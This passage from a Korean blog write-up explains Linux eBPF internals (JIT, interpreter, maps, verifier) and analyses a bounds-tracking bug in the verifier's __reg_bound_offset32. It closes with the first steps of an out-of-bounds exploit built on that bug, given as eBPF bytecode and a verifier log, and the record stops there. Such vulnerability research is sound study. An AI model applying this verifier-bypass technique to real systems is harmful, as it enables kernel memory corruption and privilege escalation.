		<span class="n">bpf_jit_dump</span><span class="p">(</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">,</span> <span class="n">proglen</span><span class="p">,</span> <span class="n">pass</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">image</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">image</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">bpf_jit_binary_lock_ro</span><span class="p">(</span><span class="n">header</span><span class="p">);</span>
		<span class="n">prog</span><span class="o">-&gt;</span><span class="n">bpf_func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">image</span><span class="p">;</span>
		<span class="n">prog</span><span class="o">-&gt;</span><span class="n">jited</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		<span class="n">prog</span><span class="o">-&gt;</span><span class="n">jited_len</span> <span class="o">=</span> <span class="n">proglen</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">prog</span> <span class="o">=</span> <span class="n">orig_prog</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="p">...</span>

<span class="p">}</span>
</code></pre></div></div>

<p>JIT 컴파일 된 코드는 이런 실행 함수에서 실행되게 된다. ctf에서 자주보던 vm과 동일하게 생겼다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">u64</span> <span class="n">__no_fgcse</span> <span class="nf">___bpf_prog_run</span><span class="p">(</span><span class="n">u64</span> <span class="o">*</span><span class="n">regs</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insn</span><span class="p">,</span> <span class="n">u64</span> <span class="o">*</span><span class="n">stack</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#define BPF_INSN_2_LBL(x, y)    [BPF_##x | BPF_##y] = &amp;&amp;x##_##y
</span>
<span class="p">...</span>

<span class="nl">select_insn:</span>
	<span class="k">goto</span> <span class="o">*</span><span class="n">jumptable</span><span class="p">[</span><span class="n">insn</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">];</span>

	<span class="cm">/* ALU */</span>
<span class="cp">#define ALU(OPCODE, OP)			\
	ALU64_##OPCODE##_X:		\
		DST = DST OP SRC;	\
		CONT;			\
	ALU_##OPCODE##_X:		\
		DST = (u32) DST OP (u32) SRC;	\
		CONT;			\
	ALU64_##OPCODE##_K:		\
		DST = DST OP IMM;		\
		CONT;			\
</span></code></pre></div></div>

<p>아래부터는 실제 코드 예시.</p>

<p>input eBPF code: <code class="highlighter-rouge">BPF_LD_MAP_FD(BPF_REG_9, mapfd)</code>. insn ⇒ JIT 컴파일 후 나온 코드</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">p</span> <span class="n">insn</span>
<span class="err">$</span><span class="mi">53</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">code</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">,</span>
  <span class="n">dst_reg</span> <span class="o">=</span> <span class="mh">0x9</span><span class="p">,</span>
  <span class="n">src_reg</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">off</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">imm</span> <span class="o">=</span> <span class="mh">0x607c000</span>
<span class="p">}</span>
</code></pre></div></div>

<p>goto문으로 인해 특정 주소로 점프</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">l</span> <span class="o">*</span><span class="n">jumptable</span><span class="p">[</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0xffffffff8114949a</span> <span class="n">is</span> <span class="n">in</span> <span class="n">___bpf_prog_run</span> <span class="p">(</span><span class="n">kernel</span><span class="o">/</span><span class="n">bpf</span><span class="o">/</span><span class="n">core</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">1430</span><span class="p">).</span>
<span class="p">...</span>
<span class="mi">1429</span>		<span class="n">LD_IMM_DW</span><span class="o">:</span>
<span class="mi">1430</span>			<span class="n">DST</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span> <span class="n">insn</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">imm</span> <span class="o">|</span> <span class="p">((</span><span class="n">u64</span><span class="p">)</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span> <span class="n">insn</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">imm</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">;</span>
<span class="mi">1431</span>			<span class="n">insn</span><span class="o">++</span><span class="p">;</span>
<span class="mi">1432</span>			<span class="n">CONT</span><span class="p">;</span>
<span class="mi">1433</span>		<span class="n">ALU_ARSH_X</span><span class="o">:</span>
<span class="mi">1434</span>			<span class="n">DST</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span> <span class="p">(((</span><span class="n">s32</span><span class="p">)</span> <span class="n">DST</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">SRC</span><span class="p">);</span>
</code></pre></div></div>

<p>실제 점프 확인</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1429</span>	 	<span class="n">LD_IMM_DW</span><span class="o">:</span>
 <span class="err">→</span> <span class="mi">1430</span>	 		<span class="n">DST</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span> <span class="n">insn</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">imm</span> <span class="o">|</span> <span class="p">((</span><span class="n">u64</span><span class="p">)</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span> <span class="n">insn</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">imm</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">;</span>
   <span class="mi">1431</span>	 		<span class="n">insn</span><span class="o">++</span><span class="p">;</span>
   <span class="mi">1432</span>	 		<span class="n">CONT</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="ebpf">eBPF</h2>

<p>기존BPF는 <code class="highlighter-rouge">A</code>, <code class="highlighter-rouge">X</code>두개의 레지스터만 있었는데 <code class="highlighter-rouge">R0</code> ~ <code class="highlighter-rouge">R10</code>까지 확장되었다. 또한 메모리와 스택을 사용 가능하다. 제한적인 BPF와 달리 거의 어셈블리와 거의 동일하게 사용 가능해졌다. 기본적인 사용은 아래와 같이 가능하다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_3</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1">// R3 = 1</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">/include/linux/filter.c</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
</span></code></pre></div></div>

<p>그 외 예제들</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_ARSH</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_5</span><span class="p">)</span> <span class="c1">// R7 &gt;&gt; r5</span>
<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>         <span class="c1">// if (REG3 != 0) jmp 3</span>
<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_3</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span> <span class="c1">// R3 = [R9 + 24]</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">// [R8+0] = R6</span>
</code></pre></div></div>

<p>eBPF프로그램이 처음 로드될 때 <code class="highlighter-rouge">BPF_PROG_LOAD</code>명령을 실행하는데 이 명령은 프로그램의 file descriptor를 리턴한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">type</span><span class="p">,</span>
		<span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">insns</span><span class="p">),</span>
		<span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">insn_cnt</span><span class="p">,</span>
		<span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">license</span><span class="p">),</span>
		<span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">bpf_log_buf</span><span class="p">),</span>
		<span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_BPF</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
</code></pre></div></div>

<h3 id="maps">Maps</h3>

<p>데이터를 저장할 때 eBPF 프로그램은 <code class="highlighter-rouge">map</code>을 사용할 수 있다. 일반적인 key-value로 이루어진 맵이다. 만들어진 맵 또한 file descriptor를 이용해 접근 가능하다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BPF_MAP_CREATE_LAST_FIELD btf_value_type_id
</span><span class="cm">/* called via syscall */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">map_create</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">numa_node</span> <span class="o">=</span> <span class="n">bpf_map_attr_numa_node</span><span class="p">(</span><span class="n">attr</span><span class="p">);</span>
	<span class="k">struct</span> <span class="n">bpf_map_memory</span> <span class="n">mem</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">f_flags</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">err</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="cm">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span>
	<span class="n">map</span> <span class="o">=</span> <span class="n">find_and_alloc_map</span><span class="p">(</span><span class="n">attr</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">map</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>

	<span class="c1">// bpf_obj_name_cpy는 copy_from_user와 같은 역할</span>
	<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_obj_name_cpy</span><span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">map_name</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_map</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">btf_key_type_id</span> <span class="o">||</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">btf_value_type_id</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">btf</span> <span class="o">*</span><span class="n">btf</span><span class="p">;</span>

		<span class="n">btf</span> <span class="o">=</span> <span class="n">btf_get_by_fd</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">btf_fd</span><span class="p">);</span>

		<span class="p">...</span>

		<span class="n">map</span><span class="o">-&gt;</span><span class="n">btf</span> <span class="o">=</span> <span class="n">btf</span><span class="p">;</span>
		<span class="n">map</span><span class="o">-&gt;</span><span class="n">btf_key_type_id</span> <span class="o">=</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">btf_key_type_id</span><span class="p">;</span>
		<span class="n">map</span><span class="o">-&gt;</span><span class="n">btf_value_type_id</span> <span class="o">=</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">btf_value_type_id</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">map</span><span class="o">-&gt;</span><span class="n">spin_lock_off</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">security_bpf_map_alloc</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_map</span><span class="p">;</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_map_alloc_id</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_map_sec</span><span class="p">;</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_map_new_fd</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">f_flags</span><span class="p">);</span>

	<span class="p">...</span>

	<span class="k">return</span> <span class="n">err</span><span class="p">;</span>

<span class="nl">free_map_sec:</span>
	<span class="n">security_bpf_map_free</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
<span class="nl">free_map:</span>
	<span class="n">btf_put</span><span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">btf</span><span class="p">);</span>
	<span class="n">bpf_map_charge_move</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mem</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">memory</span><span class="p">);</span>
	<span class="n">map</span><span class="o">-&gt;</span><span class="n">ops</span><span class="o">-&gt;</span><span class="n">map_free</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
	<span class="n">bpf_map_charge_finish</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mem</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">map = find_and_alloc_map(attr);</code>을 이용해 새로 메모리를 할당하고, 이름 붙히고, 넣을 아이디 생성하고 fd에 연결시켜서 리턴한다. 결과적으로 mmap과 비슷하다.</p>

<h3 id="jit">JIT</h3>

<p>퍼포먼스적인 이유로 eBPF로 만든 프로그램은 JIT컴파일 되어 기계어로 바뀐다. 바꾼 기계어를 그대로 실행한다. 위 소켓에서 bpf필터링 걸 때 봤던 매크로다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BPF_PROG_RUN(prog, ctx)	({				\
	u32 ret;						\
	cant_sleep();						\
	if (static_branch_unlikely(&amp;bpf_stats_enabled_key)) {	\
		struct bpf_prog_stats *stats;			\
		u64 start = sched_clock();			\
		ret = (*(prog)-&gt;bpf_func)(ctx, (prog)-&gt;insnsi);	\
		stats = this_cpu_ptr(prog-&gt;aux-&gt;stats);		\
		u64_stats_update_begin(&amp;stats-&gt;syncp);		\
		stats-&gt;cnt++;					\
		stats-&gt;nsecs += sched_clock() - start;		\
		u64_stats_update_end(&amp;stats-&gt;syncp);		\
	} else {						\
		ret = (*(prog)-&gt;bpf_func)(ctx, (prog)-&gt;insnsi);	\
	}							\
	ret; })
</span></code></pre></div></div>

<p>위 코드에서 <code class="highlighter-rouge">(*(prog)-&gt;bpf_func)(ctx, (prog)→insnsi);</code>에서 JIT 컴파일 된 바이너리를 실행한다. 컴파일 하는 시점은 처음 프로그램을 올릴때인 <code class="highlighter-rouge">BPF_PROG_LOAD</code>명령을 실행할 때이다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* last field in 'union bpf_attr' used by this command */</span>
<span class="cp">#define	BPF_PROG_LOAD_LAST_FIELD attach_prog_fd
</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uattr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">type</span> <span class="o">=</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">prog_type</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">license</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
	<span class="n">bool</span> <span class="n">is_gpl</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">bpf_prog_load_fixup_attach_type</span><span class="p">(</span><span class="n">attr</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_prog_load_check_attach</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">attr</span><span class="o">-&gt;</span><span class="n">expected_attach_type</span><span class="p">,</span>
				       <span class="n">attr</span><span class="o">-&gt;</span><span class="n">attach_btf_id</span><span class="p">,</span>
				       <span class="n">attr</span><span class="o">-&gt;</span><span class="n">attach_prog_fd</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

	<span class="cm">/* plain bpf_prog allocation */</span>
	<span class="n">prog</span> <span class="o">=</span> <span class="n">bpf_prog_alloc</span><span class="p">(</span><span class="n">bpf_prog_size</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">insn_cnt</span><span class="p">),</span> <span class="n">GFP_USER</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prog</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
	
	<span class="p">,,,</span>

	<span class="n">atomic64_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">aux</span><span class="o">-&gt;</span><span class="n">refcnt</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="n">prog</span><span class="o">-&gt;</span><span class="n">gpl_compatible</span> <span class="o">=</span> <span class="n">is_gpl</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_prog_is_dev_bound</span><span class="p">(</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">aux</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_prog_offload_init</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">attr</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
			<span class="k">goto</span> <span class="n">free_prog</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="p">...</span>

	<span class="cm">/* run eBPF verifier */</span>
	<span class="c1">// JIT 컴파일 되는 시점</span>
	<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_check</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prog</span><span class="p">,</span> <span class="n">attr</span><span class="p">,</span> <span class="n">uattr</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_used_maps</span><span class="p">;</span>

	<span class="n">prog</span> <span class="o">=</span> <span class="n">bpf_prog_select_runtime</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">err</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_used_maps</span><span class="p">;</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">bpf_prog_alloc_id</span><span class="p">(</span><span class="n">prog</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">free_used_maps</span><span class="p">;</span>

	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이렇게 만들어진 코드를 verifier(<code class="highlighter-rouge">/kernel/bpf/verifier.c</code>)에서 검사한다. 검사하는 과정중 코드의 흐름을 체크하는 과정은 크게 다섯가지이다.</p>

<ul>
  <li>알 수 없는 함수 호출</li>
  <li>한 함수에서 다른 함수로 넘어가지 않음</li>
  <li>범위를 벗어나는 점프</li>
  <li>알 수 없는 명령어 코드</li>
  <li>루프</li>
</ul>

<p>데이터 플로우도 비슷하다. 0 divide나 그런 간단한 것을 확인한다.</p>

<p>검증을 마친 뒤 JIT컴파일 되고, 실행된다. 즉 Bytecode → Verifier → JIT → program run</p>

<h1 id="bug">bug</h1>

<p>취약점은 바로 위에서 설명된 verifier에서 트리거 된다. verifier는 JIT컴파일 중에 32비트 64비트마다 다른 연산을 가지고 있다. <code class="highlighter-rouge">bpf_reg_state</code>구조체를 보면 현재 레지스터가 가질 수 있는 값의 범위를 정의하고, 실제 가지고 있는 값을 저장하고 있다.(u = unsigned, s = signed)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="cm">/* For scalar types (SCALAR_VALUE), this represents our knowledge of
	 * the actual value.
	 * For pointer types, this represents the variable part of the offset
	 * from the pointed-to object, and is shared with all bpf_reg_states
	 * with the same id as us.
	 */</span>
	<span class="k">struct</span> <span class="n">tnum</span> <span class="n">var_off</span><span class="p">;</span>
	<span class="cm">/* Used to determine if any memory access using this register will
	 * result in a bad access.
	 * These refer to the same value as var_off, not necessarily the actual
	 * contents of the register.
	 */</span>
	<span class="n">s64</span> <span class="n">smin_value</span><span class="p">;</span> <span class="cm">/* minimum possible (s64)value */</span>
	<span class="n">s64</span> <span class="n">smax_value</span><span class="p">;</span> <span class="cm">/* maximum possible (s64)value */</span>
	<span class="n">u64</span> <span class="n">umin_value</span><span class="p">;</span> <span class="cm">/* minimum possible (u64)value */</span>
	<span class="n">u64</span> <span class="n">umax_value</span><span class="p">;</span> <span class="cm">/* maximum possible (u64)value */</span>
</code></pre></div></div>

<p>var_off는 value와 mask값을 가지고 있고, value는 실제 값이다. 만약 value가 <code class="highlighter-rouge">0x1111</code>이고 mask가 <code class="highlighter-rouge">0x220000</code>면 value는 <code class="highlighter-rouge">0x221111</code>과 <code class="highlighter-rouge">0x1111</code>을 가지게 된다. 취약점이 발생한 함수인 <code class="highlighter-rouge">__reg_bound_offset32</code>이다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">__reg_bound_offset32</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">reg</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u64</span> <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xffffFFFF</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">tnum</span> <span class="n">range</span> <span class="o">=</span> <span class="n">tnum_range</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">umin_value</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">,</span>
				       <span class="n">reg</span><span class="o">-&gt;</span><span class="n">umax_value</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">);</span>
	<span class="k">struct</span> <span class="n">tnum</span> <span class="n">lo32</span> <span class="o">=</span> <span class="n">tnum_cast</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="k">struct</span> <span class="n">tnum</span> <span class="n">hi32</span> <span class="o">=</span> <span class="n">tnum_lshift</span><span class="p">(</span><span class="n">tnum_rshift</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span> <span class="mi">32</span><span class="p">),</span> <span class="mi">32</span><span class="p">);</span>

	<span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span> <span class="o">=</span> <span class="n">tnum_or</span><span class="p">(</span><span class="n">hi32</span><span class="p">,</span> <span class="n">tnum_intersect</span><span class="p">(</span><span class="n">lo32</span><span class="p">,</span> <span class="n">range</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">reg→umin_value &amp; 0xffffffff</code>를 하고 있는데 컴파일 시 최소값을 <code class="highlighter-rouge">1</code>, 최대값을 <code class="highlighter-rouge">2**32+1</code>로 주게 된다면 범위는 <code class="highlighter-rouge">[1, 1]</code>이 된다. 이렇게 만든 값을 <code class="highlighter-rouge">tnum_intersect</code>로 내보내 상위 비트와 or연산을 하여 <code class="highlighter-rouge">var_off</code>를 완성한다.</p>

<p>이를 이용하려면 레지스터의 제약조건을 맞춰주면 된다.</p>

<ul>
  <li>실제 값이 2</li>
  <li>range = [1, 2**32 + 1 == 1]</li>
  <li>32비트 비교 연산</li>
</ul>

<p>여기서 실제 값을 세팅하려고 <code class="highlighter-rouge">BPF_MOV64_REG(BPF_REG_0, 2)</code> 이런식으로 세팅하게 되면 range는 <code class="highlighter-rouge">[2, 2]</code>가 되어버린다. 이를 우회하기 위해 map을 만들고 메모리를 바꾸고, 바뀐 메모리를 불러 검사하는 과정으로 진행한다. oob를 위한 range가 변조 된 r6 준비</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 할당된 메모리 주소</span>
<span class="mi">0</span><span class="p">:</span> <span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="nx">r9</span> <span class="o">=</span> <span class="mh">0xffff8880060cc000</span>
<span class="mi">2</span><span class="p">:</span> <span class="p">(</span><span class="nx">bf</span><span class="p">)</span> <span class="nx">r1</span> <span class="o">=</span> <span class="nx">r9</span>
<span class="mi">3</span><span class="p">:</span> <span class="p">(</span><span class="nx">bf</span><span class="p">)</span> <span class="nx">r2</span> <span class="o">=</span> <span class="nx">r10</span>
<span class="mi">4</span><span class="p">:</span> <span class="p">(</span><span class="mi">07</span><span class="p">)</span> <span class="nx">r2</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">4</span>
<span class="mi">5</span><span class="p">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">)</span> <span class="o">*</span><span class="p">(</span><span class="nx">u32</span> <span class="o">*</span><span class="p">)(</span><span class="nx">r10</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
<span class="mi">6</span><span class="p">:</span> <span class="p">(</span><span class="mi">85</span><span class="p">)</span> <span class="nx">call</span> <span class="nx">bpf_map_lookup_elem</span><span class="err">#</span><span class="mi">1</span>
<span class="mi">7</span><span class="p">:</span> <span class="p">(</span><span class="mi">55</span><span class="p">)</span> <span class="k">if</span> <span class="nx">r0</span> <span class="o">!=</span> <span class="mh">0x0</span> <span class="nx">goto</span> <span class="nx">pc</span><span class="o">+</span><span class="mi">1</span>
 <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R9_w</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">8</span><span class="p">:</span> <span class="p">(</span><span class="mi">95</span><span class="p">)</span> <span class="nx">exit</span>

